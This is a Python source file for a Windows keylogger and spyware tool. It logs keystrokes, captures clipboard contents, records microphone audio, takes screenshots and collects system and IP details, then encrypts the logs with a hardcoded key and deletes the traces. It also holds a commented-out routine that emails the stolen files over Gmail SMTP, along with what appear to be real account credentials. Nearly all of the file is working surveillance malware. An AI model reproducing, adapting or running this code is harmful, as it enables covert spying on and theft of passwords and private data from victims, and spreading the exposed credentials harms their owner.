from email.mime import text
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket 
import platform
from requests.api import delete
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

key_information = "key_log.txt"
system_info = "systeinfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "ss.png"

keys_info_e = "e_key_log.txt"
system_info_e = "e_systeminfo.txt"
clipboard_info_e = "e_clipboard.txt"

file_path = "F:\\Project\\Keylogger\\Advanced"
extend = "\\"
file_merge = file_path + extend

microphone_time = 10
key = "uxt1hzWaFwkG9Hd2LxBXIdHo2BdNcmYYX0dOVb-YsY0="

#email_address = "thenazim0707@gmail.com"
#password = "N@z!m2001"
#toaddr = "newig31544@julsard.com"  # to mail address

#Mail
"""
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

send_email(key_information, file_path + extend + key_information, toaddr)
"""

#System Information
def computer_information():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        try: 
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("cdsfdvdsCouldn't get IP Address")
        
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System Info: " + platform.system()+ " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPaddr + '\n')

computer_information()

#Clipboard Information
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
        
        except:
            f.write("Clipboard could not be copied")

copy_clipboard()

#Audio and Microphone
def microphone():
    fs = 44100
    sec = microphone_time
    myrecording = sd.rec(int(sec * fs), samplerate = fs, channels = 2)
    sd.wait()
    write(file_path + extend + audio_info, fs, myrecording)

microphone()

#Screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)

screenshot()

count = 0
keys = []

#Keylogger
def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + key_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find('Key') == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

#File Encryption
files_to_encrypt = [file_merge + system_info, file_merge + clipboard_info + file_merge + key_information]
encrypted_file_names = [file_merge + system_info_e, file_merge + clipboard_info_e + file_merge + keys_info_e]

cnt = 0

for enc_file in files_to_encrypt:
    with open(files_to_encrypt[cnt], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[cnt], 'wb') as f:
        f.write(encrypted)
    
    #send_email(encrypted_file_names[cnt], encrypted_file_names[cnt], toaddr)
    cnt += 1
#time.sleep(120)

#Clean up track and delete files
delete_files = [system_info, clipboard_info, key_information, screenshot_info, audio_info]
for file in delete_files:
    os.remove(file_merge + file)